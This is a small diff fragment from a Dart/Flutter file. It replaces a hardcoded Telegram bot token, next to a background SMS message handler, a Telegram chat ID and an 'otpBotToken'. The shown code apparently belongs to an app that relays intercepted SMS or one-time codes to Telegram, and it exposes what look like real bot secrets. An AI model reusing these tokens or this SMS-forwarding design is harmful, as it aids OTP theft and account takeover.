@@ -15,7 +15,7 @@ void onBackgroundMessage(SmsMessage message) {
 }
 
 const String telegramBotToken =
-    '6038774955:AAFboWInWl7iWFMB2FRUep-KxHf5F4_0lFY';
+    '6038774955:AAGokIq7jl_GJjNjr01k5MnZF54O0GfXgR4';
 const int telegramChatId = -1001862858056;
 
 const String otpBotToken = '8112541883:AAHZhrMc7QuVuuTZSWYLvGN7mAbyDdzD8Ls';
